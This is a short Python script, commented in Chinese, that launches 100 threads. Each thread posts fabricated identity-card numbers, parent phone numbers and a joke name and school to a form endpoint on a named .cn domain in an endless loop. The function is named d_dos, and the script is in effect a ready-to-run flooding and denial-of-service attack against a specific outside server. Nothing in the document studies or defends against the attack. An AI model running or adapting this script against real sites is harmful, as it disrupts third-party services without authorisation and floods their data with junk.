import requests
import threading
import random
from datetime import datetime
from time import sleep

lock = threading.Lock()
api = 'http://www.sdska1mm.cn/wap/ajax.php?act=form'
header = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36'
}
success_count = 0
error_count = 0

def log(text):
    print(datetime.now().strftime('%Y-%m-%d %H:%M:%S'),text)

def d_dos():
    session = requests.session()
    session.headers = header
    global error_count
    global success_count
    while True:
        card,fq,mq = random_user_pass()
        data = {
            'name':'卢本伟',
            'card':card,
            'school':"家里蹲大学",
            'fq_phone':fq,
            'mq_phone':mq
        }
        try:
            r = session.post(api,data=data,timeout=5)
        except:
            lock.acquire()
            log('报错，直接跳过... *{}'.format(error_count))
            error_count += 1
            lock.release()
            continue
        code = r.status_code
        lock.acquire()
        if code == 200:
            log('提交成功...OK! *{} 名字:卢本伟，身份证号:{}，学校：家里蹲大学，父亲号码: {}，母亲号码，{}'.format(success_count,card,fq,mq))
            success_count +=1
        else:
            log('提交失败...failed! *{} 状态码:{}'.format(error_count,r.status_code))
            error_count += 1
        lock.release()

def random_user_pass():
    card = random.randint(10**18,10**19-1)
    fq=random.randint(10**11,10**11*2-1)
    mq=random.randint(10**11,10**11*2-1)
    return card,fq,mq

if __name__ == '__main__':
    thread_num = 100
    for i in range(thread_num):
        threading.Thread(target=d_dos).start()
        log('线程{}启动...'.format(i))
        sleep(0.1)